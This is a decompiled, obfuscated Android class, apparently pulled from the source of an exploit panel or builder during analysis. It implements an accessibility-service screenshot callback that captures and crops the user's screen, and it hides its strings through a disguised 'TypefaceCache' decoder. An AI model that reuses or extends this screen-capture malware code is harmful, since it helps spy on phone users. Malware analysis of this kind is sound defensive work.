package v.s;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import app.mobilex.plus.util.TypefaceCache;
import java.util.concurrent.CountDownLatch;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class EXFdIC4sJuGvFXtBxD implements AccessibilityService.TakeScreenshotCallback {
    public final /* synthetic */ s50M5De8F5UWQVP09E dDIMxZXP1V8HdM;
    public final /* synthetic */ CountDownLatch vekpFI4d1Nc4fakF;
    public final /* synthetic */ aqjfZUF02xH6w w9sT1Swbhx3hs;

    public EXFdIC4sJuGvFXtBxD(s50M5De8F5UWQVP09E s50m5de8f5uwqvp09e, aqjfZUF02xH6w aqjfzuf02xh6w, CountDownLatch countDownLatch) {
        this.dDIMxZXP1V8HdM = s50m5de8f5uwqvp09e;
        this.w9sT1Swbhx3hs = aqjfzuf02xh6w;
        this.vekpFI4d1Nc4fakF = countDownLatch;
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onFailure(int i) {
        int i2 = s50M5De8F5UWQVP09E.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B008100F100B600DE00A20027003A001B008400FF00BB00D700FA");
        this.vekpFI4d1Nc4fakF.countDown();
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
        aqjfZUF02xH6w aqjfzuf02xh6w = this.w9sT1Swbhx3hs;
        s50M5De8F5UWQVP09E s50m5de8f5uwqvp09e = this.dDIMxZXP1V8HdM;
        try {
            HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
            Bitmap bitmapWrapHardwareBuffer = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
            hardwareBuffer.close();
            if (bitmapWrapHardwareBuffer != null) {
                Bitmap bitmapCopy = bitmapWrapHardwareBuffer.copy(Bitmap.Config.ARGB_8888, false);
                bitmapWrapHardwareBuffer.recycle();
                if (bitmapCopy != null && s50m5de8f5uwqvp09e.Ee8d2j4S9Vm5yGuR > 0 && bitmapCopy.getHeight() >= s50m5de8f5uwqvp09e.Ee8d2j4S9Vm5yGuR) {
                    aqjfzuf02xh6w.w9sT1Swbhx3hs = Bitmap.createBitmap(bitmapCopy, 0, 0, bitmapCopy.getWidth(), s50m5de8f5uwqvp09e.Ee8d2j4S9Vm5yGuR);
                    if (aqjfzuf02xh6w.w9sT1Swbhx3hs != bitmapCopy) {
                        bitmapCopy.recycle();
                    }
                }
            }
        } catch (Throwable th) {
            int i = s50M5De8F5UWQVP09E.ibVTtJUNfrGYbW;
            TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B008300F500BC00DD00A300260036005E009500E200B000C000FD0063");
            th.getMessage();
        }
        this.vekpFI4d1Nc4fakF.countDown();
    }
}
